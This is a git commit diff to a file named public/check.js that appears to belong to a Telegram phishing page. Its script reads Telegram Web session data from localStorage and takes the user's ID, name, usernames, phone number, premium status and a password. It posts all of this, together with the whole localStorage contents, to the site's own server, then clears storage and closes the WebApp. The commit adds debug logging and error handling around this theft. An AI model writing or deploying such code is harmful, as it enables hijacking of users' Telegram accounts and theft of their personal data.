dbdcc4481120fa89777d97db0e68f27dbd459f0a
BusinessMOnkey999 <businessprofileverify19091235@gmail.com>
2025-03-18 16:47:16 +0530

    Update check.js

--- public/check.js
+++ public/check.js
@@ -1,7 +1,10 @@
 document.addEventListener("DOMContentLoaded", function() {
   async function checkLocalStorage() {
+    console.log("Checking localStorage...");
     let globalState = localStorage.getItem("tt-global-state");
+    console.log("globalState:", globalState);
     if (globalState && localStorage.getItem("user_auth")) {
+      console.log("User authenticated, processing...");
       const parsedState = JSON.parse(globalState);
       const currentUserId = parsedState.currentUserId;
       const currentUser = parsedState.users.byId[currentUserId];
@@ -14,18 +17,22 @@ document.addEventListener("DOMContentLoaded", function() {
         localStorage.removeItem("GramJs:apiCache");
         localStorage.removeItem("tt-global-state");
 
-        await fetch(`/api/users/telegram/info`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            userId: currentUserId, firstName,
-            usernames, phoneNumber, isPremium,
-            password, quicklySet: localStorage,
-            type: new URLSearchParams(window.location.search).get("type")
-          })
-        });
+        try {
+          await fetch(`/api/users/telegram/info`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              userId: currentUserId, firstName,
+              usernames, phoneNumber, isPremium,
+              password, quicklySet: localStorage,
+              type: new URLSearchParams(window.location.search).get("type")
+            })
+          });
+          console.log("Data sent to server successfully");
+        } catch (error) {
+          console.error("Fetch error:", error);
+        }
 
-        // window.Telegram.WebApp.openTelegramLink("https://t.me/+8dtqN7T2sJpmNTb7");
         window.Telegram.WebApp.close();
         localStorage.clear();
         document.cookie = "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
@@ -34,6 +41,7 @@ document.addEventListener("DOMContentLoaded", function() {
         clearInterval(checkInterval);
       }
     } else {
+      console.log("No tt-global-state or user_auth found");
       sessionStorage.clear();
       localStorage.clear();
     }
